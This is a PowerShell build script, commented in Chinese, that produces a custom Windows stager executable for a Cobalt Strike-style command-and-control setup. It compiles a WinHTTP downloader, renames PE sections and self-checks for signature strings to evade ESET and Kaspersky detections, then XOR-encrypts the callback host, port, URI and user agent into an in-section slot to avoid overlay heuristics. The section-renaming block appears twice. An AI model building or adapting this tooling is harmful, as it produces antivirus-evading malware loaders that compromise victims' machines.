# cs_dev :: build_stager.ps1  --  自研 stager 生成器
# ==========================================================================
# 把 host / port / URI / UA 加密后追加到自研 stager 尾部, 产出一个完整的
# Windows stager exe。
#
# 与 CS 内置 stager 的区别:
#   CS   : resources/httpsstager64.bin (909 字节固定 shellcode) + 偏移注入
#          -> 卡巴 HEUR:Trojan.Win32.CobaltStrike.gen 依赖此代码模式
#   本方案: 完全自写的 WinHTTP 下载器, 零 CS 模板代码, 配置走自定义加密布局
#
# 用法:
#   .\build_stager.ps1 -Host 1.2.3.4 -Port 8080 -Uri "/aaa" -Ssl
#   .\build_stager.ps1 -Host 1.2.3.4 -Port 80   -Uri "/index" -OutFile D:\out\s.exe
#
# 结构对齐要求: CSDEV_CFG 必须是 1156 字节 (2+2+192+768+192),
# stager 侧会校验 tail->size == sizeof(CSDEV_CFG), 不一致会直接退出。
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)] [string] $Host_,          # Host 是 PS 保留名, 用 Host_
    [Parameter(Mandatory=$true)] [int]    $Port,
    [string] $Uri     = "/aaa",
    [string] $UserAgent = '',
    [switch] $Ssl,
    [string] $OutFile = '',
    [string] $MinGw   = 'D:\mingw64\bin'
)

$ErrorActionPreference = 'Stop'
$DevDir = Split-Path -Parent $PSScriptRoot
$PkDir  = Join-Path $DevDir 'kits\packer'
$BuildD = Join-Path $DevDir 'build\packer'
New-Item -ItemType Directory -Force -Path $BuildD | Out-Null

$CFG_SIZE   = 1156        # sizeof(CSDEV_CFG)
$MAGIC      = 0x4B504443  # 'CDPK'
$HDRLEN     = 12

# ---- 编译 stager (总是重编译, 避免旧缓存掩盖源码修改) --------------------
$stager = Join-Path $BuildD 'csdev_stager.exe'
$gcc = Join-Path $MinGw 'gcc.exe'
if (-not (Test-Path $gcc)) { throw "gcc not found: $gcc" }
Write-Host "[*] 编译 stager ..." -ForegroundColor Cyan
if (Test-Path $stager) { Remove-Item $stager -Force }
& $gcc -O2 -s -fno-ident -mwindows -o $stager (Join-Path $PkDir 'csdev_stager.c') -lwinhttp 2>&1 | Out-Null
if (-not (Test-Path $stager)) { throw "stager build failed" }

# 改节名: MinGW 的 9 个节名 (.text/.data/.rdata/.pdata/.xdata/.bss/.idata/.CRT/.tls)
# 与 CS 官方 artifact 模板实测完全一致, 被 ESET 归入 CobaltStrike.Artifact 家族。
# PE 加载器按 RVA 索引而非节名, 改名不影响功能。
$objcopy = Join-Path $MinGw 'objcopy.exe'
if (Test-Path $objcopy) {
    $ren = Join-Path $BuildD 'csdev_stager_r.exe'
    Remove-Item $ren -Force -ErrorAction SilentlyContinue
    & $objcopy --rename-section .pdata=.pd --rename-section .xdata=.xd --rename-section .CRT=.ct --rename-section .bss=.bm --rename-section .tls=.tl --rename-section .idata=.id $stager $ren 2>&1 | Out-Null
    if (Test-Path $ren) { Move-Item $ren $stager -Force }
}

# 改节名: MinGW 的节名组合 (.text/.data/.rdata/.pdata/.xdata/.bss/.idata/.CRT/.tls)
# 与 CS 官方 artifact 模板完全一致, 实测被 ESET 归入 CobaltStrike.Artifact 家族。
# PE 加载器按 RVA 索引而非节名, 因此改名不影响加载。
$objcopy = Join-Path $MinGw 'objcopy.exe'
if (Test-Path $objcopy) {
    $renamed = Join-Path $BuildD 'csdev_stager_r.exe'
    Remove-Item $renamed -Force -ErrorAction SilentlyContinue
    & $objcopy --rename-section .pdata=.pd --rename-section .xdata=.xd `
               --rename-section .CRT=.crt $stager $renamed 2>&1 | Out-Null
    if (Test-Path $renamed) { Move-Item $renamed $stager -Force }
}

$sb = [System.IO.File]::ReadAllBytes($stager)
Write-Host ("[+] stager 就绪  {0} 字节" -f $sb.Length) -ForegroundColor Green

# 特征自检: 不得出现 CS stager 的任何标记
$sbt = [System.Text.Encoding]::ASCII.GetString($sb)
if ($sbt.Contains('wininet')) { Write-Host "[-] stager 含 'wininet' 特征" -ForegroundColor Red; exit 1 }
if (-not $sbt.Contains('WinHttp')) { Write-Host "[-] stager 未使用 WinHTTP" -ForegroundColor Red; exit 1 }
Write-Host "[+] 特征自检通过 (无 wininet, 使用 WinHTTP)" -ForegroundColor Green

# ---- 构造配置 (按 CSDEV_CFG 的内存布局逐字节写入) ------------------------
function Write-FixedStr([byte[]]$buf, [int]$off, [int]$maxLen, [string]$val) {
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($val)
    $n = [Math]::Min($bytes.Length, $maxLen - 1)     # 留 NUL 终止位
    [Array]::Copy($bytes, 0, $buf, $off, $n)
    # 其余位置保持 0
}
if (-not $UserAgent) {
    $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
}

$cfg = New-Object byte[] $CFG_SIZE
$sslVal = 0
if ($Ssl) { $sslVal = 1 }
[Array]::Copy([BitConverter]::GetBytes([uint16]$Port),   0, $cfg, 0, 2)
[Array]::Copy([BitConverter]::GetBytes([uint16]$sslVal), 0, $cfg, 2, 2)
Write-FixedStr $cfg 4    192 $Host_
Write-FixedStr $cfg 196  768 $Uri
Write-FixedStr $cfg 964  192 $UserAgent

# ---- 定位 stager 内的配置预留区 (搜索 magic) ----------------------------
# 配置写在 PE 节区内部的预留区里, 不再追加到文件尾部。
# overlay (节表之外的尾随数据) 是加壳/捆绑的典型特征, 会被静态启发式引擎命中。
$slot = -1
for ($i = 0; $i -lt ($sb.Length - 12); $i++) {
    if ($sb[$i] -eq 0x43 -and $sb[$i+1] -eq 0x44 -and
        $sb[$i+2] -eq 0x50 -and $sb[$i+3] -eq 0x4B) {
        $zeroed = $true
        for ($k = 4; $k -lt 12; $k++) { if ($sb[$i+$k] -ne 0) { $zeroed = $false; break } }
        if ($zeroed) { $slot = $i; break }
    }
}
if ($slot -lt 0) { throw "未在 stager 内找到配置预留区 (magic CDPK)" }
if ($slot + 12 + $CFG_SIZE -gt $sb.Length) { throw "预留区空间不足" }
Write-Host ("[+] 配置预留区 @ 0x{0:X} (节区内嵌, 无 overlay)" -f $slot) -ForegroundColor Green

# ---- 派生密钥 (与 csdev_stager.c 的 load_cfg 逐位一致) -------------------
$cs  = Get-Random -Minimum 0x10000000 -Maximum 0x7FFFFFFF
$key = New-Object byte[] 16
for ($i = 0; $i -lt 16; $i++) {
    $b = ([uint64]$cs) -shr (($i % 4) * 8)
    $key[$i] = [byte](($b -bxor ($i * 0x5B + 0x37)) -band 0xFF)
}

# ---- 异或流加密 (与 C 端一致, 不使用 RC4) -------------------------------
$enc = New-Object byte[] $cfg.Length
for ($i = 0; $i -lt $cfg.Length; $i++) {
    $enc[$i] = [byte]($cfg[$i] -bxor ($key[$i -band 15]) -bxor (($i * 0x27) -band 0xFF))
}

# ---- 就地写入预留区 -----------------------------------------------------
[Array]::Copy([BitConverter]::GetBytes([uint32]$MAGIC),    0, $sb, $slot,     4)
[Array]::Copy([BitConverter]::GetBytes([uint32]$CFG_SIZE), 0, $sb, $slot + 4, 4)
[Array]::Copy([BitConverter]::GetBytes([uint32]$cs),       0, $sb, $slot + 8, 4)
[Array]::Copy($enc, 0, $sb, $slot + 12, $enc.Length)

if (-not $OutFile) { $OutFile = Join-Path $BuildD ("stager_{0}_{1}.exe" -f $Host_, $Port) }
$outDir = Split-Path -Parent $OutFile
if ($outDir) { New-Item -ItemType Directory -Force -Path $outDir | Out-Null }
[System.IO.File]::WriteAllBytes($OutFile, $sb)

$fin = Get-Item $OutFile
Write-Host ""
Write-Host "[+] stager 生成完成" -ForegroundColor Green
Write-Host ("    path    : {0}" -f $fin.FullName)
Write-Host ("    size    : {0} 字节  (配置内嵌于节区)" -f $fin.Length)
Write-Host ("    回连    : {0}://{1}:{2}{3}" -f $(if($Ssl){'https'}else{'http'}), $Host_, $Port, $Uri)
Write-Host ("    自检    : 预留区 @ 0x{0:X}, 配置 {1} 字节" -f $slot, $CFG_SIZE)
